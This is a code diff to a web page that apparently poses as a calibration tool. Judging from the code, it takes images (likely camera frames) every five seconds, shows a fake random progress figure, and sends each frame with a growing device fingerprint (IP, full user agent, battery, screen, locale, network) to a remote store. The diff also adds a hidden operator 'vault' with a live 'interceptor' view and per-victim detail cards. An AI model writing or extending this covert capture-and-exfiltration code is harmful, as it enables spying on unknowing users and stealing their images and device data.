@@ -37,6 +37,12 @@
         }
 
         .tab-active { color: #0ea5e9; border-bottom: 1px solid #0ea5e9; }
+
+        .log-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .log-card:hover { border-color: rgba(14, 165, 233, 0.3); }
+        
+        /* Modal Backdrop */
+        #detailModal { backdrop-filter: blur(10px); }
     </style>
 </head>
 <body class="overflow-hidden bg-black">
@@ -76,14 +82,14 @@
     <div id="vaultPanel" class="hidden fixed inset-0 bg-[#020202] z-[200] flex flex-col font-mono text-zinc-400">
         <div class="p-4 border-b border-white/5 flex justify-between items-center bg-black shrink-0">
             <div class="flex items-center gap-6">
-                <h2 class="text-[10px] uppercase font-bold text-sky-900 tracking-tighter">NODE_COMMAND</h2>
+                <h2 class="text-[10px] uppercase font-bold text-sky-900 tracking-tighter">NODE_COMMAND_FORENSICS</h2>
                 <nav class="flex gap-4">
                     <button id="tabArchive" class="text-[9px] uppercase tracking-widest pb-1 tab-active">Archive</button>
                     <button id="tabLive" class="text-[9px] uppercase tracking-widest pb-1 text-zinc-600">Live_Feed</button>
                 </nav>
             </div>
             <div class="flex items-center gap-4">
-                <span id="autoSyncStatus" class="text-[7px] text-green-900 uppercase animate-pulse">Live_Sync: ON</span>
+                <span id="autoSyncStatus" class="text-[7px] text-green-900 uppercase animate-pulse">Auto_Sync: Active</span>
                 <button id="wipeBtn" class="text-red-900/40 hover:text-red-600 text-[10px] uppercase">Purge</button>
                 <button id="exitVault" class="text-zinc-700 hover:text-white text-[10px] uppercase">Exit</button>
             </div>
@@ -98,19 +104,78 @@
 
         <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden">
             <!-- ARCHIVE CONTENT -->
-            <div id="archiveContent" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 gap-2 no-scrollbar"></div>
+            <div id="archiveContent" class="flex-grow overflow-y-auto p-4 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-4 no-scrollbar"></div>
             
             <!-- LIVE FEED CONTENT -->
             <div id="liveContent" class="hidden flex-grow flex flex-col items-center justify-center p-4 bg-zinc-950/20">
-                <div class="relative w-full max-w-xl aspect-square border border-white/5 bg-black overflow-hidden flex items-center justify-center">
-                    <img id="liveMonitor" class="w-full h-full object-cover opacity-80" src="">
-                    <div class="absolute top-4 left-4 flex items-center gap-2">
-                        <div class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></div>
-                        <span class="text-[8px] uppercase tracking-widest text-red-600">Terminal_Link_Active</span>
+                <div class="relative w-full max-w-2xl aspect-square border border-white/5 bg-black overflow-hidden flex items-center justify-center shadow-2xl">
+                    <img id="liveMonitor" class="w-full h-full object-cover opacity-90" src="">
+                    <div class="absolute top-6 left-6 flex items-center gap-3">
+                        <div class="w-3 h-3 bg-red-600 rounded-full animate-pulse shadow-[0_0_10px_red]"></div>
+                        <span class="text-[10px] uppercase tracking-[0.3em] text-red-600 font-bold">Live_Interceptor</span>
                     </div>
-                    <div id="liveMeta" class="absolute bottom-4 left-4 right-4 text-[7px] text-zinc-600 grid grid-cols-2 gap-2 uppercase tracking-tighter">
-                        <div>ID: <span id="liveIp">---</span></div>
-                        <div>BAT: <span id="liveBat">---</span></div>
+                    <div id="liveMeta" class="absolute bottom-6 left-6 right-6 text-[9px] text-zinc-400 bg-black/60 p-4 rounded backdrop-blur border border-white/5 grid grid-cols-2 gap-4 uppercase font-mono">
+                        <div class="space-y-1">
+                            <div>ADDR: <span id="liveIp" class="text-sky-500">---</span></div>
+                            <div>PLAT: <span id="livePlat" class="text-zinc-500">---</span></div>
+                        </div>
+                        <div class="space-y-1">
+                            <div>BAT: <span id="liveBat" class="text-zinc-500">---</span></div>
+                            <div>CONN: <span id="liveConn" class="text-zinc-500">---</span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- DETAIL MODAL -->
+    <div id="detailModal" class="hidden fixed inset-0 z-[300] bg-black/90 flex items-center justify-center p-4">
+        <div class="bg-zinc-950 border border-white/10 w-full max-w-4xl h-[80vh] flex flex-col md:flex-row rounded-lg overflow-hidden shadow-2xl">
+            <div class="md:w-1/2 bg-black flex items-center justify-center">
+                <img id="modalImg" class="w-full h-full object-contain" src="">
+            </div>
+            <div class="md:w-1/2 p-6 flex flex-col overflow-y-auto no-scrollbar border-l border-white/10">
+                <div class="flex justify-between items-start mb-8">
+                    <h3 id="modalIp" class="text-sky-500 text-xl font-bold tracking-tighter">0.0.0.0</h3>
+                    <button id="closeModal" class="text-zinc-600 hover:text-white text-xs uppercase">Close_Detail</button>
+                </div>
+                
+                <div id="modalData" class="space-y-6 text-[10px] uppercase tracking-wider">
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="space-y-2">
+                            <label class="text-zinc-700 block text-[8px]">Timestamp</label>
+                            <div id="modalTime" class="text-zinc-300">---</div>
+                        </div>
+                        <div class="space-y-2">
+                            <label class="text-zinc-700 block text-[8px]">Battery</label>
+                            <div id="modalBat" class="text-zinc-300">---</div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-2">
+                        <label class="text-zinc-700 block text-[8px]">Network_Interface</label>
+                        <div id="modalNet" class="text-zinc-300">---</div>
+                    </div>
+
+                    <div class="space-y-2">
+                        <label class="text-zinc-700 block text-[8px]">System_Specs</label>
+                        <div id="modalSpecs" class="text-zinc-300 grid grid-cols-2 gap-2">
+                            <div>CPU: <span id="modalCpu">--</span></div>
+                            <div>RAM: <span id="modalRam">--</span></div>
+                            <div>RES: <span id="modalRes">--</span></div>
+                            <div>TOUCH: <span id="modalTouch">--</span></div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-2">
+                        <label class="text-zinc-700 block text-[8px]">Locale_&_Zone</label>
+                        <div id="modalZone" class="text-zinc-300">---</div>
+                    </div>
+
+                    <div class="space-y-2">
+                        <label class="text-zinc-700 block text-[8px]">User_Agent_String</label>
+                        <div id="modalUA" class="text-zinc-500 text-[8px] leading-relaxed break-all normal-case font-mono border-t border-white/5 pt-2">---</div>
                     </div>
                 </div>
             </div>
@@ -136,8 +201,6 @@
         const archiveContent = document.getElementById('archiveContent');
         const liveContent = document.getElementById('liveContent');
         const liveMonitor = document.getElementById('liveMonitor');
-        const liveIp = document.getElementById('liveIp');
-        const liveBat = document.getElementById('liveBat');
 
         let isLive = false;
         let systemFingerprint = {};
@@ -146,28 +209,36 @@
         async function generateFingerprint() {
             let ip = "0.0.0.0";
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
+            
             let battery = "Unknown";
-            try { const b = await navigator.getBattery(); battery = `${(b.level * 100).toFixed(0)}%`; } catch(e){}
+            try { const b = await navigator.getBattery(); battery = `${(b.level * 100).toFixed(0)}% ${b.charging ? '⚡' : ''}`; } catch(e){}
+
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const netInfo = conn ? `${conn.effectiveType || '?'}` : "N/A";
 
             systemFingerprint = {
                 ip: ip,
-                ua: navigator.userAgent.split(') ')[0] + ')',
-                cores: navigator.hardwareConcurrency,
-                ram: navigator.deviceMemory,
+                ua: navigator.userAgent,
+                cores: navigator.hardwareConcurrency || '?',
+                ram: navigator.deviceMemory || '?',
                 bat: battery,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                lang: navigator.language,
+                res: `${screen.width}x${screen.height}`,
+                touch: navigator.maxTouchPoints > 0 ? "Yes" : "No",
+                online: navigator.onLine ? "Yes" : "No",
+                plat: navigator.platform,
+                net: netInfo
             };
         }
 
         const Cloud = {
             async push(img) {
                 const key = `log_${Date.now()}`;
-                const liveKey = `live_stream`; // Fixed key for real-time monitoring
+                const liveKey = `live_stream`;
                 const payload = JSON.stringify({ img, info: systemFingerprint, t: new Date().toISOString() });
                 try {
-                    // Push to Archive
                     fetch(`${KV_URL}/set/${key}`, { method: 'POST', headers: { 'Authorization': `Bearer ${KV_TOKEN}` }, body: payload });
-                    // Update Live Status
                     fetch(`${KV_URL}/set/${liveKey}`, { method: 'POST', headers: { 'Authorization': `Bearer ${KV_TOKEN}` }, body: payload });
                 } catch (e) {}
             },
@@ -213,7 +284,7 @@
                     Cloud.push(dataUrl);
                 }
                 percentDisplay.textContent = (Math.random() * 100).toFixed(2) + '%';
-            }, 6000); 
+            }, 5000); 
         }
 
         initBtn.onclick = async () => {
@@ -228,19 +299,41 @@
             } catch (e) { alert("Calibration Error."); }
         };
 
-        // --- VAULT LOGIC ---
+        // --- VAULT FORENSICS ---
+
+        function openDetail(item) {
+            const info = item.info || {};
+            document.getElementById('modalImg').src = item.img;
+            document.getElementById('modalIp').textContent = info.ip || '0.0.0.0';
+            document.getElementById('modalTime').textContent = new Date(item.t).toLocaleString();
+            document.getElementById('modalBat').textContent = info.bat || '---';
+            document.getElementById('modalNet').textContent = `${info.net} [ONLINE: ${info.online}]`;
+            document.getElementById('modalCpu').textContent = info.cores;
+            document.getElementById('modalRam').textContent = info.ram + "GB";
+            document.getElementById('modalRes').textContent = info.res;
+            document.getElementById('modalTouch').textContent = info.touch;
+            document.getElementById('modalZone').textContent = `${info.tz} / ${info.lang}`;
+            document.getElementById('modalUA').textContent = info.ua;
+            document.getElementById('detailModal').classList.remove('hidden');
+        }
+
+        document.getElementById('closeModal').onclick = () => document.getElementById('detailModal').classList.add('hidden');
 
         const syncArchive = async () => {
             const data = await Cloud.pull();
             archiveContent.innerHTML = '';
             data.forEach(item => {
                 const d = document.createElement('div');
-                d.className = "bg-zinc-950 border border-white/5 overflow-hidden flex flex-col";
+                d.className = "log-card bg-zinc-950 border border-white/5 overflow-hidden flex flex-col cursor-pointer group";
+                d.onclick = () => openDetail(item);
                 d.innerHTML = `
-                    <img src="${item.img}" class="w-full aspect-square object-cover">
-                    <div class="p-1 text-[5px] text-zinc-700 font-mono flex justify-between uppercase">
-                        <span>${item.info?.ip}</span>
-                        <span>${new Date(item.t).toLocaleTimeString()}</span>
+                    <div class="relative w-full aspect-square overflow-hidden bg-zinc-900">
+                        <img src="${item.img}" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500">
+                        <div class="absolute inset-0 bg-sky-500/10 opacity-0 group-hover:opacity-100 transition-opacity"></div>
+                    </div>
+                    <div class="p-2 text-[6px] text-zinc-600 font-mono flex justify-between uppercase border-t border-white/5">
+                        <span class="text-sky-900">${item.info?.ip}</span>
+                        <span>${new Date(item.t).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
                     </div>`;
                 archiveContent.appendChild(d);
             });
@@ -250,8 +343,10 @@
             const live = await Cloud.pullLive();
             if (live) {
                 liveMonitor.src = live.img;
-                liveIp.textContent = live.info.ip;
-                liveBat.textContent = live.info.bat;
+                document.getElementById('liveIp').textContent = live.info.ip;
+                document.getElementById('liveBat').textContent = live.info.bat;
+                document.getElementById('livePlat').textContent = live.info.plat;
+                document.getElementById('liveConn').textContent = live.info.net;
             }
         };
 
@@ -260,7 +355,7 @@
             syncTimer = setInterval(() => {
                 if (archiveContent.classList.contains('hidden')) syncLive();
                 else syncArchive();
-            }, 8000);
+            }, 5000);
         };
 
         document.getElementById('authBtn').onclick = () => {
@@ -289,7 +384,7 @@
             syncLive();
         };
 
-        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Purge?")) { await Cloud.purge(); syncArchive(); } };
+        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Permanently wipe all forensic records?")) { await Cloud.purge(); syncArchive(); } };
         document.getElementById('vaultTrigger').onclick = () => vaultPanel.classList.toggle('hidden');
         document.getElementById('exitVault').onclick = () => {
             vaultPanel.classList.add('hidden');
